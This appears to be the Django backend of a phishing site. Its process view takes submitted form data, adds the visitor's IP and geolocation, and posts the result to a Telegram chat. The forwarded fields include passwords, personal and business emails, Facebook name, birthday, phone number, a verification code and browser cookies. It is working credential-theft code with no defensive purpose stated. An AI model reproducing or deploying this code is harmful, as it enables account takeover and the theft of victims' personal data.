from django.shortcuts import render
import requests
from notification.views import send_telegram_message
from datetime import datetime
import json

# Create your views here.
def index(request):
    return render(request=request, template_name='index.html')


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def get_geolocation(public_ip):
    try:
        # Make a request to ipinfo.io to retrieve geolocation data
        response = requests.get(f"https://ipinfo.io/{public_ip}/json")
        geolocation_data = response.json()

        # Extract country code and city from the response
        country_code = geolocation_data.get("country")
        city = geolocation_data.get("city")
        latitude, longitude = geolocation_data.get("loc").split(",")

        # Create a JSON response with the geolocation information
        response_data = {
            "country_code": country_code,
            "city": city,
            "latitude": latitude,
            "longtitude": longitude
        }
        return response_data
    except Exception as e:
        return None


def process(request):
    if request.method == 'POST':
        final_data = {}
        public_ip = get_client_ip(request)
        print(public_ip)
        geolocation = get_geolocation(public_ip)
        final_data['public_ip'] = public_ip
        final_data.update(geolocation)
        submit_data = json.loads(request.body)['dât']
        print(submit_data)
        print(type(submit_data))
        final_data.update(submit_data)
        print(final_data)
        message = '[{}]: New information submitted \n*IP:* {}\n*Country Code:* {}\n*City:* {} \n*Proxy:* {}\n*Latitude:* {}\n*Longtitude:* {}\n*Information:* {}\n*Business Email:* {}\n*Personal Email*: {}\n*Password: * {}\n*Fullname: *{}\n*Facebook Name:* {}\n*Birthday: * {}\n*Phone*: {}\n*User Agent:* {}\n*Code:* {}\n*Cookie*: {}'.format(
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"), public_ip, final_data.get('country_code', ''),
            final_data.get('city', ''), final_data.get('proxy', ''), final_data.get('latitude', ''),
            final_data.get('longtitude', ''),
            final_data.get('information', ''), final_data.get('business_email', ''),
            final_data.get('personal_email', ''), final_data.get('password', ''), final_data.get('fullname', ''),
            final_data.get('facebook_name', ''), final_data.get('dob', ''), final_data.get('phone', ''),
            final_data.get('user_agent', ''), final_data.get('code', ''), final_data.get('cookie', ''))
        send_telegram_message(message)
        return render(request=request, template_name='form.html')
    else:
        return render(request=request, template_name='form.html')
